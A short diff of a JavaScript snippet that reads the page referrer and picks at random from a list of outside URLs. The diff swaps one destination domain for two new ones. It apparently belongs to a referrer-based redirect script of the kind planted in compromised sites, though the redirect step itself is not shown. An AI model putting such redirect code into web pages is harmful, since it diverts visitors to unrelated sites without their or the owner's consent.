@@ -4,7 +4,8 @@
     	var cek = document.referrer;
 
     	var ars 	= rChoice([
-							'https://rekomenaja.com/',
+							'https://ayoktaaruf.my.id/',
+							'https://markzone.live/',
 							]);
 
 				function rChoice(arr) {
